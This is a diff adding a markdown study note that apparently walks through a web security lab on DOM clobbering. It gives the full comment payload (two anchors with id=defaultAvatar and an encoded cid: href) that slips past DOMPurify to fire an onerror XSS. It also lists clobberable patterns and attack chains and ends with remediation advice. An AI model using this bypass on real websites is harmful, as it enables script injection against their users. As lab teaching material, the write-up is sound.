@@ -2691,3 +2691,516 @@ For exploit prevention:
 ## 🔥 Final Easy Understanding
 
 The payload uses window.x as a temporary memory flag. First time the iframe loads, x does not exist, so the redirect happens. Then x becomes 1, which prevents future redirects and stops the iframe from entering an infinite reload loop.
+
+---
+
+# 🧠Lab-6 DOM Clobbering via Browser Auto-Created Variables
+
+---
+
+## 📝 Overview
+
+This lab demonstrates:
+
+• DOM clobbering
+
+• browser auto-created JavaScript variables
+
+• HTML-to-object conversion abuse
+
+• XSS without direct `<script>` injection
+
+
+Main idea:
+
+Attacker injects HTML
+        ↓
+Browser converts HTML into fake JS object
+        ↓
+Website trusts fake object
+        ↓
+Attacker controls dangerous property
+        ↓
+XSS executes
+
+This is an advanced DOM attack where:
+
+• no direct script tag is injected
+
+• browser behavior itself becomes the vulnerability
+
+---
+
+## 🧭 What Is This Topic?
+
+DOM clobbering happens when:
+
+• attacker injects HTML
+
+• browser automatically creates JavaScript variables from HTML IDs/names
+
+• those fake variables overwrite real JavaScript objects
+
+
+The website then accidentally trusts attacker-controlled objects.
+
+---
+
+## ⚠️ Core Browser Behavior
+
+Example:
+
+```html
+<div id="test">
+```
+
+Browser may automatically create:
+
+```js
+window.test
+```
+
+This is old browser behavior for convenience.
+
+Attackers abuse this behavior.
+
+---
+
+## ⚠️ Vulnerable Code
+
+The lab JavaScript contains:
+
+```js
+let defaultAvatar =
+window.defaultAvatar || {
+   avatar:'/resources/images/avatarDefault.svg'
+}
+```
+
+---
+
+## 🧠 What Developer Thinks
+
+Developer assumes:
+
+```js
+window.defaultAvatar
+```
+
+will either:
+
+• not exist OR
+
+• contain safe object
+
+
+If it does not exist:
+
+```js
+{
+ avatar:'/resources/images/avatarDefault.svg'
+}
+```
+
+is used safely.
+
+---
+
+## ⚠️ Why This Is Dangerous
+
+Because attacker can inject:
+
+```html
+id=defaultAvatar
+```
+
+which browser converts into:
+
+```js
+window.defaultAvatar
+```
+
+This overwrites/clobbers the original object.
+
+---
+
+## 🔄 Lab Walkthrough
+
+### 📝 Step 1 — Open Blog Post
+
+Go to any blog post page.
+
+---
+
+### 📝 Step 2 — Inject DOM Clobbering Payload
+
+Post this as a comment:
+
+```html
+<a id=defaultAvatar>
+<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+```
+
+---
+
+## 🧠 Payload Breakdown
+
+### ⚠️ First Anchor
+
+```html
+<a id=defaultAvatar>
+```
+
+Browser creates:
+
+```js
+window.defaultAvatar
+```
+
+---
+
+### ⚠️ Second Anchor
+
+```html
+<a id=defaultAvatar name=avatar href="...">
+```
+
+Same ID again.
+
+Browser groups both anchors into:
+
+```js
+DOM Collection
+```
+
+Like:
+
+```js
+defaultAvatar[0]
+defaultAvatar[1]
+```
+
+---
+
+## ⚠️ Important Trick
+
+This attribute:
+
+```html
+name=avatar
+```
+
+creates property:
+
+```js
+defaultAvatar.avatar
+```
+
+---
+
+## ⚠️ href Value
+
+```html
+href="cid:&quot;onerror=alert(1)//"
+```
+
+becomes attacker-controlled value.
+
+---
+
+## 🧠 Why cid: Is Used
+
+Website uses:
+
+```txt
+DOMPurify
+```
+
+filter.
+
+DOMPurify blocks many dangerous payloads.
+
+BUT:
+
+```txt
+cid:
+```
+
+protocol is allowed
+
+encoded quotes survive filtering
+
+---
+
+## ⚠️ What &quot; Means
+
+```html
+&quot;
+```
+
+means:
+
+```txt
+"
+```
+
+encoded double quote.
+
+Browser later decodes it.
+
+---
+
+## ⚠️ Final Browser Interpretation
+
+This:
+
+```txt
+cid:&quot;onerror=alert(1)//
+```
+
+becomes:
+
+```txt
+cid:"onerror=alert(1)//
+```
+
+---
+
+### 📝 Step 3 — Browser Creates Fake JS Object
+
+Browser internally creates something like:
+
+```js
+window.defaultAvatar.avatar =
+'cid:"onerror=alert(1)//'
+```
+
+---
+
+### 📝 Step 4 — Website Uses Poisoned Object
+
+Website later does something conceptually like:
+
+```js
+img.src = defaultAvatar.avatar
+```
+
+After clobbering:
+
+```js
+img.src = 'cid:"onerror=alert(1)//'
+```
+
+---
+
+### 📝 Step 5 — HTML Attribute Breakout
+
+Browser interprets it similarly to:
+
+```html
+<img src="cid:" onerror=alert(1)//">
+```
+
+---
+
+### 📝 Step 6 — Image Fails
+
+Broken image source triggers:
+
+```txt
+onerror
+```
+
+---
+
+### 📝 Step 7 — XSS Executes
+
+Browser runs:
+
+```js
+alert(1)
+```
+
+Lab solved.
+
+---
+
+## ⚠️ Why Second Comment Is Needed
+
+This is important.
+
+---
+
+### 📝 First Comment
+
+Creates poisoned/clobbered object.
+
+BUT website JS may not immediately reprocess comments.
+
+---
+
+### 📝 Second Comment
+
+Triggers page reload/reprocessing.
+
+Now website reads poisoned:
+
+```js
+window.defaultAvatar
+```
+
+and XSS executes.
+
+---
+
+## 🔄 Attack Flow
+
+Inject HTML
+      ↓
+Browser auto-creates fake object
+      ↓
+Fake object overwrites real JS variable
+      ↓
+Website trusts poisoned object
+      ↓
+Attacker-controlled value inserted into image src
+      ↓
+Broken image triggers onerror
+      ↓
+XSS
+
+---
+
+## 🌍 Real-World Scenarios
+
+DOM clobbering commonly appears in:
+
+• comment systems
+
+• markdown renderers
+
+• WYSIWYG editors
+
+• profile bios
+
+• CMS systems
+
+• rich-text forums
+
+• blog engines
+
+
+Especially when:
+
+• script tags blocked
+
+• HTML partially allowed
+
+• id/name attributes allowed
+
+---
+
+## 🎯 High-Value Targets
+
+Common dangerous targets:
+
+```txt
+script.src
+img.src
+iframe.src
+form.action
+dynamic URL builders
+plugin loaders
+analytics scripts
+```
+
+---
+
+## ⚠️ Dangerous Patterns
+
+Very dangerous code patterns:
+
+```js
+window.someObject || {}
+
+window.config || defaultConfig
+
+window.user || {}
+```
+
+because attacker may clobber:
+
+```txt
+config
+user
+object
+avatar
+settings
+```
+
+---
+
+## 🧠 Mental Model
+
+Attacker injects HTML IDs and names
+        ↓
+Browser converts them into fake JS variables/properties
+        ↓
+Website trusts those variables
+        ↓
+Attacker controls dangerous behavior
+
+---
+
+## 🔗 Multi-Chain Attacks
+
+DOM clobbering can chain into:
+
+• DOM XSS
+
+• script injection
+
+• malicious script loading
+
+• redirect abuse
+
+• CSRF chains
+
+• account takeover
+
+---
+
+## 🛡️ Remediation
+
+Developers should:
+
+• avoid relying on `window.object || {}`
+
+• avoid implicit global variables
+
+• avoid trusting browser-created globals
+
+• use strict DOM lookups
+
+• sanitize allowed HTML carefully
+
+
+Safe approach:
+
+```js
+document.getElementById()
+```
+
+instead of:
+
+```js
+automatic globals
+
+implicit window properties
+```
+
+---
+
+## 🎯 Final Easy Understanding
+
+DOM clobbering tricks the browser into turning attacker HTML into fake JavaScript objects. The website accidentally trusts those fake objects and uses attacker-controlled values in dangerous places, leading to XSS.
